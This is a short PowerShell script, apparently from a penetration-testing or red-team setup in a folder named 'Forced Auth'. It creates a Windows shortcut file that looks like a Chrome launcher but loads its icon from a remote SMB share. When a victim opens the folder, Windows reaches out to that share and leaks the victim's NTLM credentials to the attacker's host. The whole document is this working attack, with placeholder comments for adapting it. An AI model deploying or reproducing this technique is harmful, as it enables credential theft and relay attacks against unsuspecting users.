$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("C:\Users\tbrady\Desktop\Forced Auth\shortcut.lnk")
$Shortcut.TargetPath = "C:\Program Files\Google\Chrome\Application\Chrome.exe" # Change to the target application's path
$Shortcut.IconLocation = "\\192.168.50.224\files\icon.ico" # Change to your icon path
$Shortcut.Save()
